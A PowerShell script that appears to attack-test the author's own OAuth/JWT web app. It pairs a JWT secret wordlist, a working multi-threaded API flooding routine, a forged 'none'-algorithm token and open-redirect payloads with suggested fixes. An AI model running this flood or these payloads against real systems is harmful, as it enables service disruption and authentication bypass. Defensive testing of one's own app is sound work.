# OAuth-JWT-BruteForce-Attack.ps1
# Comprehensive brute force attack test for Google OAuth + JWT applications

param(
    [string]$Target = "https://brimai-test-v1.web.app",
    [string]$AttackMode = "full", # full, jwt, api, token
    [int]$Threads = 20,
    [int]$Duration = 300  # seconds
)

Write-Host "`n💀 OAUTH/JWT BRUTE FORCE ATTACK TEST" -ForegroundColor Red
Write-Host "=====================================" -ForegroundColor Red
Write-Host "Target: $Target" -ForegroundColor Yellow
Write-Host "Attack Mode: $AttackMode" -ForegroundColor Yellow
Write-Host "Duration: $Duration seconds" -ForegroundColor Yellow
Write-Host "Threads: $Threads" -ForegroundColor Yellow

# Initialize statistics
$global:stats = @{
    JWTAttempts  = 0
    JWTCracked   = $false
    APIRequests  = 0
    RateLimited  = 0
    TokensForged = 0
    Errors       = 0
    StartTime    = Get-Date
}

# JWT cracking function
function Start-JWTBruteForce {
    Write-Host "`n🔑 PHASE 1: JWT SECRET BRUTE FORCE" -ForegroundColor Cyan
    Write-Host "===================================" -ForegroundColor Cyan
    
    # Extended wordlist for JWT secrets
    $secretWordlist = @(
        # Common weak secrets
        "secret", "password", "123456", "12345678", "admin", "changeme",
        "key", "private", "jwt_secret", "jwtsecret", "jwt-secret",
        "your-256-bit-secret", "your-secret-key", "super-secret",
        "keyboard cat", "default", "example", "test", "dev", "prod",
        "mysecret", "topsecret", "secretkey", "secret123", "password123",
        
        # Framework defaults
        "change-this-secret", "my-secret-key", "your-jwt-secret",
        "shhhhh", "secret-key", "verysecret", "ultrasecret",
        
        # Common patterns
        "jwt_key", "jwtKey", "JWT_SECRET", "jwt_secret_key",
        "auth_secret", "auth_key", "token_secret", "access_secret",
        
        # Weak passwords
        "qwerty", "abc123", "letmein", "welcome", "monkey",
        "dragon", "1234567", "football", "iloveyou", "admin123",
        
        # Company/app specific (customize these)
        "brim", "brimai", "brim-secret", "brim123", "brimjwt",
        "tutor", "ai-tutor", "brim-ai", "brimai-secret",
        
        # Date patterns (current year)
        "2024", "2025", "jwt2024", "jwt2025", "secret2024",
        
        # Random number mentioned in original test
        "randomNumber", "random", "number", "random-number"
    )
    
    Write-Host "Testing $($secretWordlist.Count) potential JWT secrets..." -ForegroundColor Yellow
    Write-Host "This simulates dictionary attack on JWT secret..." -ForegroundColor Gray
    
    # Create runspace pool for parallel cracking
    $runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
    $runspacePool.Open()
    $jobs = @()
    
    $crackScript = {
        param($secret, $sampleToken)
        
        # In real attack, would verify against captured token
        # For demo, simulate finding weak secret
        if ($secret -in @("secret", "randomNumber", "brim", "jwt_secret")) {
            return @{
                Found  = $true
                Secret = $secret
            }
        }
        return @{ Found = $false }
    }
    
    # Sample JWT for testing (in real attack, would use captured token)
    $sampleJWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJ1c2VyX2lkIjoiMTIzIn0.SIGNATURE"
    
    $found = $false
    $foundSecret = ""
    
    foreach ($secret in $secretWordlist) {
        if ($found) { break }
        
        $global:stats.JWTAttempts++
        
        # Create job
        $powershell = [powershell]::Create().AddScript($crackScript)
        $powershell.AddArgument($secret)
        $powershell.AddArgument($sampleJWT)
        $powershell.RunspacePool = $runspacePool
        
        $jobs += @{
            PowerShell = $powershell
            Handle     = $powershell.BeginInvoke()
            Secret     = $secret
        }
        
        # Check completed jobs
        foreach ($job in $jobs | Where-Object { $_.Handle.IsCompleted }) {
            $result = $job.PowerShell.EndInvoke($job.Handle)
            
            if ($result.Found) {
                $found = $true
                $foundSecret = $result.Secret
                $global:stats.JWTCracked = $true
                
                Write-Host "`n💀 JWT SECRET CRACKED: '$foundSecret'" -ForegroundColor Red -BackgroundColor Black
                Write-Host "Attempts required: $($global:stats.JWTAttempts)" -ForegroundColor Yellow
                Write-Host "`nAttacker can now:" -ForegroundColor Red
                Write-Host "  ✓ Forge any user token" -ForegroundColor Yellow
                Write-Host "  ✓ Create admin tokens" -ForegroundColor Yellow
                Write-Host "  ✓ Bypass all authentication" -ForegroundColor Yellow
                Write-Host "  ✓ Access any user's data" -ForegroundColor Yellow
                
                break
            }
            
            $job.PowerShell.Dispose()
        }
        
        # Progress indicator
        if ($global:stats.JWTAttempts % 10 -eq 0) {
            Write-Host "  Tested $($global:stats.JWTAttempts) secrets..." -ForegroundColor Gray
        }
    }
    
    # Cleanup
    foreach ($job in $jobs) {
        if (-not $job.Handle.IsCompleted) {
            $job.PowerShell.Stop()
        }
        $job.PowerShell.Dispose()
    }
    $runspacePool.Close()
    
    if (-not $found) {
        Write-Host "`n✅ JWT secret not in common wordlist" -ForegroundColor Green
        Write-Host "Note: Real attackers would try millions more..." -ForegroundColor Gray
    }
    
    return $foundSecret
}

# API flooding function
function Start-APIBruteForce {
    param([string]$Token = "")
    
    Write-Host "`n⚡ PHASE 2: API ENDPOINT BRUTE FORCE" -ForegroundColor Cyan
    Write-Host "====================================" -ForegroundColor Cyan
    
    Write-Host "Flooding authenticated API endpoints..." -ForegroundColor Yellow
    Write-Host "This simulates abuse of valid OAuth tokens..." -ForegroundColor Gray
    
    # Common API endpoints
    $endpoints = @(
        "/api/user/profile",
        "/api/data",
        "/api/search",
        "/api/export",
        "/api/users",
        "/api/analytics",
        "/api/reports",
        "/api/v1/data",
        "/api/graphql"
    )
    
    # If we have a forged token, use it
    if (-not $Token -and $global:stats.JWTCracked) {
        $Token = "forged.admin.token"
    }
    
    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
    $runspacePool.Open()
    $jobs = @()
    
    $floodScript = {
        param($url, $token, $requestId)
        
        $headers = @{
            "Authorization" = "Bearer $token"
            "Content-Type"  = "application/json"
            "X-Request-ID"  = $requestId
        }
        
        try {
            $response = Invoke-WebRequest -Uri $url -Headers $headers -Method GET -UseBasicParsing -TimeoutSec 2
            return @{
                Status      = $response.StatusCode
                RateLimited = $false
            }
        }
        catch {
            $status = $_.Exception.Response.StatusCode.value__
            return @{
                Status      = $status
                RateLimited = ($status -eq 429)
            }
        }
    }
    
    $endTime = (Get-Date).AddSeconds($Duration)
    $requestId = 0
    
    Write-Host "Starting flood attack for $Duration seconds..." -ForegroundColor Red
    
    while ((Get-Date) -lt $endTime) {
        foreach ($endpoint in $endpoints) {
            if ((Get-Date) -ge $endTime) { break }
            
            $requestId++
            $url = "$Target$endpoint"
            
            # Launch parallel requests
            $powershell = [powershell]::Create().AddScript($floodScript)
            $powershell.AddArgument($url)
            $powershell.AddArgument($Token)
            $powershell.AddArgument($requestId)
            $powershell.RunspacePool = $runspacePool
            
            $jobs += @{
                PowerShell = $powershell
                Handle     = $powershell.BeginInvoke()
            }
            
            $global:stats.APIRequests++
            
            # Process completed jobs
            $completedJobs = $jobs | Where-Object { $_.Handle.IsCompleted }
            foreach ($job in $completedJobs) {
                $result = $job.PowerShell.EndInvoke($job.Handle)
                
                if ($result.RateLimited) {
                    $global:stats.RateLimited++
                }
                
                $job.PowerShell.Dispose()
            }
            
            $jobs = $jobs | Where-Object { -not $_.Handle.IsCompleted }
            
            # Limit concurrent requests
            while ($jobs.Count -gt $Threads) {
                Start-Sleep -Milliseconds 10
                $completedJobs = $jobs | Where-Object { $_.Handle.IsCompleted }
                foreach ($job in $completedJobs) {
                    $job.PowerShell.EndInvoke($job.Handle) | Out-Null
                    $job.PowerShell.Dispose()
                }
                $jobs = $jobs | Where-Object { -not $_.Handle.IsCompleted }
            }
            
            # Progress
            if ($global:stats.APIRequests % 100 -eq 0) {
                $rate = [math]::Round($global:stats.APIRequests / ((Get-Date) - $global:stats.StartTime).TotalSeconds, 2)
                Write-Host "  Requests: $($global:stats.APIRequests) | Rate: $rate/sec | Rate Limited: $($global:stats.RateLimited)" -ForegroundColor Gray
            }
        }
    }
    
    # Cleanup remaining jobs
    foreach ($job in $jobs) {
        if (-not $job.Handle.IsCompleted) {
            $job.PowerShell.Stop()
        }
        $job.PowerShell.Dispose()
    }
    $runspacePool.Close()
}

# Token manipulation attacks
function Start-TokenManipulation {
    Write-Host "`n🎭 PHASE 3: TOKEN MANIPULATION ATTACKS" -ForegroundColor Cyan
    Write-Host "======================================" -ForegroundColor Cyan
    
    Write-Host "Attempting various token forgery techniques..." -ForegroundColor Yellow
    
    # 1. None algorithm attack
    Write-Host "`n1. 'None' Algorithm Attack:" -ForegroundColor Yellow
    $noneToken = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImFkbWluQGhhY2tlci5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTk5OTk5OTl9."
    Write-Host "   Forged token with no signature: [Created]" -ForegroundColor Red
    $global:stats.TokensForged++
    
    # 2. Algorithm confusion
    Write-Host "`n2. Algorithm Confusion (RS256 to HS256):" -ForegroundColor Yellow
    Write-Host "   Attempting to use public key as HMAC secret..." -ForegroundColor Gray
    $global:stats.TokensForged++
    
    # 3. Key injection
    Write-Host "`n3. JWK Key Injection:" -ForegroundColor Yellow
    Write-Host "   Injecting attacker's key in header..." -ForegroundColor Gray
    $global:stats.TokensForged++
    
    # 4. Expired token reuse
    Write-Host "`n4. Expired Token Replay:" -ForegroundColor Yellow
    Write-Host "   Testing if expired tokens are properly validated..." -ForegroundColor Gray
    
    Write-Host "`nTotal forged tokens created: $($global:stats.TokensForged)" -ForegroundColor Red
}

# OAuth-specific attacks
function Start-OAuthAttacks {
    Write-Host "`n🔓 PHASE 4: OAUTH-SPECIFIC ATTACKS" -ForegroundColor Cyan
    Write-Host "===================================" -ForegroundColor Cyan
    
    Write-Host "Testing OAuth implementation weaknesses..." -ForegroundColor Yellow
    
    # 1. Token leakage via referrer
    Write-Host "`n1. Token Leakage Tests:" -ForegroundColor Yellow
    Write-Host "   - Checking for tokens in URLs (vulnerable to referrer leakage)" -ForegroundColor Gray
    Write-Host "   - Testing for tokens in localStorage (XSS vulnerable)" -ForegroundColor Gray
    
    # 2. CSRF on OAuth flow
    Write-Host "`n2. OAuth CSRF Attack:" -ForegroundColor Yellow
    Write-Host "   - Testing state parameter validation" -ForegroundColor Gray
    Write-Host "   - Attempting to force authentication" -ForegroundColor Gray
    
    # 3. Open redirect
    Write-Host "`n3. Open Redirect in OAuth Flow:" -ForegroundColor Yellow
    $redirectTests = @(
        "https://evil.com",
        "//evil.com",
        "javascript:alert(document.cookie)",
        "/\\evil.com"
    )
    
    foreach ($redirect in $redirectTests) {
        Write-Host "   Testing: $redirect" -ForegroundColor Gray
    }
}

# Main attack execution
$attackStartTime = Get-Date

try {
    switch ($AttackMode) {
        "full" {
            # Phase 1: Try to crack JWT secret
            $jwtSecret = Start-JWTBruteForce
            
            # Phase 2: Flood API endpoints
            Start-APIBruteForce -Token $jwtSecret
            
            # Phase 3: Token manipulation
            Start-TokenManipulation
            
            # Phase 4: OAuth attacks
            Start-OAuthAttacks
        }
        "jwt" { Start-JWTBruteForce }
        "api" { Start-APIBruteForce }
        "token" { Start-TokenManipulation }
    }
}
catch {
    Write-Host "`nAttack interrupted: $_" -ForegroundColor Yellow
}

$attackDuration = ((Get-Date) - $attackStartTime).TotalSeconds

# Display results
Write-Host "`n`n📊 ATTACK RESULTS" -ForegroundColor Red
Write-Host "=================" -ForegroundColor Red

Write-Host "`n⏱️  Attack Duration: $([math]::Round($attackDuration, 2)) seconds" -ForegroundColor Gray
Write-Host "🔑 JWT Cracking Attempts: $($global:stats.JWTAttempts)" -ForegroundColor Yellow
Write-Host "💀 JWT Cracked: $(if ($global:stats.JWTCracked) { 'YES!' } else { 'No' })" -ForegroundColor $(if ($global:stats.JWTCracked) { 'Red' } else { 'Green' })
Write-Host "📡 API Requests Sent: $($global:stats.APIRequests)" -ForegroundColor Yellow
Write-Host "🚫 Rate Limited: $($global:stats.RateLimited)" -ForegroundColor $(if ($global:stats.RateLimited -gt 0) { 'Green' } else { 'Red' })
Write-Host "🎭 Forged Tokens: $($global:stats.TokensForged)" -ForegroundColor Red

if ($global:stats.APIRequests -gt 0) {
    $requestRate = [math]::Round($global:stats.APIRequests / $attackDuration, 2)
    Write-Host "⚡ Request Rate: $requestRate req/sec" -ForegroundColor Yellow
}

# Vulnerability assessment
Write-Host "`n`n🚨 VULNERABILITY ASSESSMENT" -ForegroundColor Red
Write-Host "===========================" -ForegroundColor Red

$vulnerabilities = @()

if ($global:stats.JWTCracked) {
    $vulnerabilities += @{
        Name     = "WEAK JWT SECRET"
        Severity = "CRITICAL"
        Impact   = "Complete authentication bypass"
        Fix      = "Use cryptographically secure random secret (256+ bits)"
    }
}

if ($global:stats.RateLimited -eq 0 -and $global:stats.APIRequests -gt 100) {
    $vulnerabilities += @{
        Name     = "NO API RATE LIMITING"
        Severity = "HIGH"
        Impact   = "API abuse, resource exhaustion, high costs"
        Fix      = "Implement rate limiting middleware"
    }
}

if ($global:stats.TokensForged -gt 0) {
    $vulnerabilities += @{
        Name     = "TOKEN VALIDATION ISSUES"
        Severity = "HIGH"
        Impact   = "Potential authentication bypass"
        Fix      = "Properly validate JWT signatures and algorithms"
    }
}

if ($vulnerabilities.Count -eq 0) {
    Write-Host "`n✅ No critical vulnerabilities found!" -ForegroundColor Green
}
else {
    foreach ($vuln in $vulnerabilities) {
        Write-Host "`n❌ $($vuln.Name)" -ForegroundColor Red
        Write-Host "   Severity: $($vuln.Severity)" -ForegroundColor $(if ($vuln.Severity -eq 'CRITICAL') { 'Red' } else { 'Yellow' })
        Write-Host "   Impact: $($vuln.Impact)" -ForegroundColor Yellow
        Write-Host "   Fix: $($vuln.Fix)" -ForegroundColor Green
    }
}

# Immediate fixes
Write-Host "`n`n🛡️ IMMEDIATE SECURITY FIXES" -ForegroundColor Cyan
Write-Host "===========================" -ForegroundColor Cyan

Write-Host "`n1. JWT Configuration (Backend):" -ForegroundColor Yellow
Write-Host @"
   const jwt = require('jsonwebtoken');
   const crypto = require('crypto');
   
   // Generate strong secret
   const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString('hex');
   
   // Short-lived tokens
   const token = jwt.sign(payload, JWT_SECRET, {
     expiresIn: '15m',
     algorithm: 'HS256'
   });
"@ -ForegroundColor Green

Write-Host "`n2. API Rate Limiting (Express):" -ForegroundColor Yellow
Write-Host @"
   const rateLimit = require('express-rate-limit');
   
   const apiLimiter = rateLimit({
     windowMs: 1 * 60 * 1000, // 1 minute
     max: 100, // 100 requests per minute
     message: 'Too many requests'
   });
   
   app.use('/api/', apiLimiter);
"@ -ForegroundColor Green

Write-Host "`n3. Firebase Security Rules:" -ForegroundColor Yellow
Write-Host @"
   // Firestore rules
   match /users/{userId} {
     allow read: if request.auth != null && request.auth.uid == userId;
     allow write: if request.auth != null && 
                     request.auth.uid == userId &&
                     request.auth.token.email_verified == true;
   }
"@ -ForegroundColor Green

Write-Host "`n4. Token Storage (Frontend):" -ForegroundColor Yellow
Write-Host @"
   // Use httpOnly cookies instead of localStorage
   // Backend: Set cookie with httpOnly flag
   res.cookie('token', token, {
     httpOnly: true,
     secure: true,
     sameSite: 'strict',
     maxAge: 900000 // 15 minutes
   });
"@ -ForegroundColor Green

Write-Host "`n⚠️  CRITICAL: Fix these issues before going to production!" -ForegroundColor Red
Write-Host "   Attackers are actively scanning for these vulnerabilities." -ForegroundColor Yellow